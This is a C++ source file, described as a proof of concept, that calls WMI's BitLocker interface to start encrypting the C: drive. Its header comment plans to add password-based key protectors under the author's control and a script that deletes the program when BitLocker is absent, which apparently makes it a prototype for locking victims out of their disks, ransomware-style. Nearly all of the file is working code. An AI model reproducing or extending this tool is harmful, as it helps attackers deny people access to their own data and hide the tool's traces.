/*
 This code is a PoC but has serious limitations

 To work, the application must run with admin privs, does not handle recovery keys
 or passwords. 
 Will need additional methods to configure these aspects I am looking at using Win32_EncryptVolume methods
 such as :
    ProtectKeyWithNumericalPassword 
    ProtectKeyWithTPM (probably not though)
    
The other limitation is that this code requires bitlocker to be enabled and configured.
Im looking into a VBscript that can check if this is the case and delete the entire application if not
:).

*/
#include <iostream>
#include <windows.h>
#include <wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

void EncryptDrive(const std::wstring& driveLetter) {
    HRESULT hres;

    // Initialize COM.
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        std::wcerr << L"Failed to initialize COM library. Error code: " << hres << std::endl;
        return;
    }

    // Initialize security.
    hres = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL);

    if (FAILED(hres)) {
        std::wcerr << L"Failed to initialize security. Error code: " << hres << std::endl;
        CoUninitialize();
        return;
    }

    // Obtain the initial locator to WMI.
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(
        CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator,
        (LPVOID*)&pLoc);

    if (FAILED(hres)) {
        std::wcerr << L"Failed to create IWbemLocator object. Error code: " << hres << std::endl;
        CoUninitialize();
        return;
    }

    // Connect to WMI through the IWbemLocator::ConnectServer method.
    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(
        L"ROOT\\CIMV2\\Security\\MicrosoftVolumeEncryption", // WMI namespace
        NULL,    // User name
        NULL,    // User password
        0,       // Locale
        NULL,    // Security flags
        0,       // Authority
        0,       // Context object
        &pSvc);  // IWbemServices proxy

    if (FAILED(hres)) {
        std::wcerr << L"Could not connect to WMI. Error code: " << hres << std::endl;
        pLoc->Release();
        CoUninitialize();
        return;
    }

    // Set the proxy so that impersonation of the client occurs.
    hres = CoSetProxyBlanket(
        pSvc,                        // Indicates the proxy to set
        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
        NULL,                        // Server principal name
        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx
        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
        NULL,                        // Client identity
        EOAC_NONE);                  // Proxy capabilities

    if (FAILED(hres)) {
        std::wcerr << L"Could not set proxy blanket. Error code: " << hres << std::endl;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return;
    }

    // Get the EncryptableVolume object for the specified drive.
    std::wstring query = L"SELECT * FROM Win32_EncryptableVolume WHERE DriveLetter = '" + driveLetter + L":\\'";
    IEnumWbemClassObject* pEnumerator = NULL;
    hres = pSvc->ExecQuery(
        L"WQL",
        const_cast<wchar_t*>(query.c_str()),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator);

    if (FAILED(hres)) {
        std::wcerr << L"Query for EncryptableVolume failed. Error code: " << hres << std::endl;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return;
    }

    IWbemClassObject* pObj = NULL;
    ULONG uReturn = 0;
    while (pEnumerator) {
        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pObj, &uReturn);
        if (uReturn == 0) {
            break;
        }

        // Call the Encrypt method.
        VARIANT vtPath;
        hres = pObj->Get(L"__PATH", 0, &vtPath, NULL, NULL);
        if (SUCCEEDED(hres)) {
            IWbemClassObject* pOutParams = NULL;
            hres = pSvc->ExecMethod(
                vtPath.bstrVal,
                L"Encrypt",
                0,
                NULL,
                NULL,
                &pOutParams,
                NULL);

            if (SUCCEEDED(hres)) {
                std::wcout << L"Encryption started successfully on " << driveLetter << L":\\" << std::endl;
            } else {
                std::wcerr << L"Failed to start encryption. Error code: " << hres << std::endl;
            }

            if (pOutParams) {
                pOutParams->Release();
            }
            VariantClear(&vtPath);
        }
        pObj->Release();
    }

    // Cleanup
    pEnumerator->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
}

int main() {
    std::wstring drive = L"C"; // Specify the drive to encrypt (e.g., C)
    EncryptDrive(drive);
    return 0;
}
